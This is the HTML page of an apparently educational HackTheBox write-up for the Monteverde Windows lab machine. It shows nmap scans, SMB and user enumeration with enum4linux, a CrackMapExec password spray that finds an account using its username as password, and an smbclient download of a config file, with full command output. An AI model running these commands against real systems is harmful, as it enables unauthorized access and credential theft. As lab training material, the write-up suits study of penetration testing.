<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Monteverde | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,medium"><meta name=description content="Monteverde HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/monteverde/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/monteverde/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Monteverde "><meta property="og:description" content="Monteverde HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/monteverde/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png"><meta name=twitter:title content="Monteverde "><meta name=twitter:description content="Monteverde HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Monteverde ","item":"https://s4ch.github.io/writeups/hackthebox/monteverde/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Monteverde ","name":"Monteverde ","description":"Monteverde HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","medium"],"articleBody":"≡ƒÆó Info Name: Monteverde Profile: www.hackthebox.eu Difficulty: Medium OS: Windows Points: 30 Overview Network enumeration: SMB enumeration Network reconnaissance: SMB share \u0026 Azure AD Connect config \u0026 credential stuffing Privilege Escalation : mhope to Administrator: hidden folder \u0026 Azure AD Connect credentials decryption Install tools used on BlackArch Linux:\n1 $ sudo pacman -S nmap crackmapexec enum4linux impacket evil-winrm Network enumeration I ran a nmap port scan to discover open ports:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ sudo nmap -p- 10.10.10.172 -oA nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET Nmap scan report for 10.10.10.172 Host is up (0.031s latency). Not shown: 65516 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49703/tcp open unknown 49775/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 123.83 seconds And then did a service discovery and script scan with nmap again on open ports.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 $ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining) Nmap scan report for 10.10.10.172 Host is up (0.031s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49675/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 49775/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=5E7BC858%P=x86_64-unknown-linux-gnu%r SF:(DNSVersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver SF:sion\\x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -48m05s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-25T20:22:50 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 275.27 seconds Let’s see what we can find through SMB with CrackMapExec, enum4linux and GetNPUsers.py from impacket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 $ cme smb 10.10.10.172 SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False) $ enum4linux -a 10.10.10.172 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Mar 25 22:30:29 2020 ========================== | Target Information | ========================== Target ........... 10.10.10.172 RID Range ........ 500-550,1000-1050 Username ......... '' Password ......... '' Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.172 | ==================================================== [E] Can't find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.172 | ============================================ Looking up status of 10.10.10.172 No reply from 10.10.10.172 ===================================== | Session Check on 10.10.10.172 | ===================================== [+] Server 10.10.10.172 allows sessions using username '', password '' [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.172 | =========================================== Unable to initialize messaging context Domain Name: MEGABANK Domain Sid: S-1-5-21-391775091-850290835-3566037492 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.172 | ====================================== [+] Got OS info for 10.10.10.172 from smbclient: [+] Got OS info for 10.10.10.172 from srvinfo: Unable to initialize messaging context Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.172 | ============================= index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos Name: Dimitris Galanos Desc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope Name: Mike Hope Desc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary Name: Ray O'Leary Desc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs Name: SABatchJobs Desc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan Name: Sally Morgan Desc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata Name: svc-ata Desc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec Name: svc-bexec Desc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp Desc: (null) user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] ========================================= | Share Enumeration on 10.10.10.172 | ========================================= Unable to initialize messaging context do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. Unable to connect with SMB1 -- no workgroup available [+] Attempting to map shares on 10.10.10.172 ==================================================== | Password Policy Information for 10.10.10.172 | ==================================================== [E] Unexpected error from polenum: [+] Attaching to 10.10.10.172 using a NULL share [+] Trying protocol 139/SMB... [!] Protocol failed: Cannot request session (Called Name:10.10.10.172) [+] Trying protocol 445/SMB... [!] Protocol failed: Missing required parameter 'digestmod'. [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 7 ============================== | Groups on 10.10.10.172 | ============================== [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[Storage Replica Administrators] rid:[0x246] [+] Getting builtin group memberships: Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs Group 'Users' (RID: 545) has member: Couldn't lookup SIDs Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f] group:[ADSyncAdmins] rid:[0x451] group:[ADSyncOperators] rid:[0x452] group:[ADSyncBrowse] rid:[0x453] group:[ADSyncPasswordSet] rid:[0x454] [+] Getting local group memberships: Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[DnsUpdateProxy] rid:[0x44e] group:[Azure Admins] rid:[0xa29] group:[File Server Admins] rid:[0xa2e] group:[Call Recording Admins] rid:[0xa2f] group:[Reception] rid:[0xa30] group:[Operations] rid:[0xa31] group:[Trading] rid:[0xa32] group:[HelpDesk] rid:[0xa33] group:[Developers] rid:[0xa34] [+] Getting domain group memberships: Group 'Operations' (RID: 2609) has member: MEGABANK\\smorgan Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\\Administrator Group 'Domain Guests' (RID: 514) has member: MEGABANK\\Guest Group 'Domain Users' (RID: 513) has member: MEGABANK\\Administrator Group 'Domain Users' (RID: 513) has member: MEGABANK\\krbtgt Group 'Domain Users' (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 Group 'Domain Users' (RID: 513) has member: MEGABANK\\mhope Group 'Domain Users' (RID: 513) has member: MEGABANK\\SABatchJobs Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-ata Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-bexec Group 'Domain Users' (RID: 513) has member: MEGABANK\\svc-netapp Group 'Domain Users' (RID: 513) has member: MEGABANK\\dgalanos Group 'Domain Users' (RID: 513) has member: MEGABANK\\roleary Group 'Domain Users' (RID: 513) has member: MEGABANK\\smorgan Group 'Trading' (RID: 2610) has member: MEGABANK\\dgalanos Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\Administrator Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 Group 'Azure Admins' (RID: 2601) has member: MEGABANK\\mhope Group 'HelpDesk' (RID: 2611) has member: MEGABANK\\roleary ======================================================================= | Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn't get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.172 | ============================================= Unable to initialize messaging context Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Wed Mar 25 22:31:39 2020 $ GetNPUsers.py -no-pass -dc-ip 10.10.10.172 MEGABANK/smorgan -\u003e nothing Thanks to enum4linux, we now have all users and groups information we need.\nLet’s try a quick bruteforce where user = password with CrackMapExec.\n1 2 3 $ cme smb 10.10.10.172 -u users.txt -p users.txt ... SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK\\SABatchJobs:SABatchJobs Network reconnaissance We found the password SABatchJobs use the username as password. Let’s use this account for enumerating some shares:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares SMB 10.10.10.172 445 MONTEVERDE [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False) SMB 10.10.10.172 445 MONTEVERDE [+] MEGABANK\\SABatchJobs:SABatchJobs SMB 10.10.10.172 445 MONTEVERDE [+] Enumerated shares SMB 10.10.10.172 445 MONTEVERDE Share Permissions Remark SMB 10.10.10.172 445 MONTEVERDE ----- ----------- ------ SMB 10.10.10.172 445 MONTEVERDE ADMIN$ Remote Admin SMB 10.10.10.172 445 MONTEVERDE azure_uploads READ SMB 10.10.10.172 445 MONTEVERDE C$ Default share SMB 10.10.10.172 445 MONTEVERDE E$ Default share SMB 10.10.10.172 445 MONTEVERDE IPC$ READ Remote IPC SMB 10.10.10.172 445 MONTEVERDE NETLOGON READ Logon server share SMB 10.10.10.172 445 MONTEVERDE SYSVOL READ Logon server share SMB 10.10.10.172 445 MONTEVERDE users$ READ Let’s find is there are valuable files in users$ share.\n1 2 3 4 5 6 7 8 9 10 $ smbclient '\\\\10.10.10.172\\users$' -U 'SABatchJobs' Unable to initialize messaging context Enter WORKGROUP\\SABatchJobs's password: Try \"help\" to get a list of possible commands. smb: \\\u003e recuse on recuse: command not found smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * getting file \\mhope\\azure.xml of size 1212 as azure.xml (4,8 KiloBytes/sec) (average 4,8 KiloBytes/sec) Let’s read /mhope/azure.xml:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ","wordCount":"2329","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png","datePublished":"2020-06-11T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/monteverde/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Monteverde</h1><div class=post-description>Monteverde HackTheBox writeup</div><div class=post-meta><span title='2020-06-11 00:00:00 +0000 UTC'>June 11, 2020</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2329 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/monteverde/monteverde.png alt="Monteverde HackTheBox Machine"><p>Monteverde - Medium Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#network-reconnaissance>Network reconnaissance</a></li><li><a href=#privilege-escalation--mhope-to-administrator>Privilege Escalation : mhope to Administrator</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Monteverde</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/223>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 30</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network enumeration</strong>: SMB enumeration</li><li><strong>Network reconnaissance</strong>: SMB share & Azure AD Connect config & credential stuffing</li><li><strong>Privilege Escalation : mhope to Administrator</strong>: hidden folder & Azure AD Connect credentials decryption</li></ul><p>Install tools used on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>pacman</span> <span class=o>-</span><span class=n>S</span> <span class=n>nmap</span> <span class=n>crackmapexec</span> <span class=n>enum4linux</span> <span class=n>impacket</span> <span class=n>evil</span><span class=o>-</span><span class=n>winrm</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>I ran a <a href=https://nmap.org/>nmap</a> port scan to discover open ports:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo nmap -p- 10.10.10.172 -oA nmap_ports
</span></span><span class=line><span class=cl>[sudo] password for cyfun:
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 21:49 CET
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.172
</span></span><span class=line><span class=cl>Host is up (0.031s latency).
</span></span><span class=line><span class=cl>Not shown: 65516 filtered ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>53/tcp    open  domain
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec
</span></span><span class=line><span class=cl>135/tcp   open  msrpc
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5
</span></span><span class=line><span class=cl>593/tcp   open  http-rpc-epmap
</span></span><span class=line><span class=cl>636/tcp   open  ldapssl
</span></span><span class=line><span class=cl>3268/tcp  open  globalcatLDAP
</span></span><span class=line><span class=cl>3269/tcp  open  globalcatLDAPssl
</span></span><span class=line><span class=cl>5985/tcp  open  wsman
</span></span><span class=line><span class=cl>9389/tcp  open  adws
</span></span><span class=line><span class=cl>49667/tcp open  unknown
</span></span><span class=line><span class=cl>49673/tcp open  unknown
</span></span><span class=line><span class=cl>49674/tcp open  unknown
</span></span><span class=line><span class=cl>49675/tcp open  unknown
</span></span><span class=line><span class=cl>49703/tcp open  unknown
</span></span><span class=line><span class=cl>49775/tcp open  unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 123.83 seconds
</span></span></code></pre></td></tr></table></div></div><p>And then did a service discovery and script scan with <a href=https://nmap.org/>nmap</a> again on open
ports.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo nmap -sSVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49703,49775 10.10.10.172 -oA nmap_services
</span></span><span class=line><span class=cl>[sudo] password for cyfun:
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 22:08 CET
</span></span><span class=line><span class=cl>Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
</span></span><span class=line><span class=cl>NSE Timing: About 99.34% done; ETC: 22:12 (0:00:01 remaining)
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.172
</span></span><span class=line><span class=cl>Host is up (0.031s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain?
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   DNSVersionBindReqTCP:
</span></span><span class=line><span class=cl>|     version
</span></span><span class=line><span class=cl>|_    bind
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-25 20:20:31Z)
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
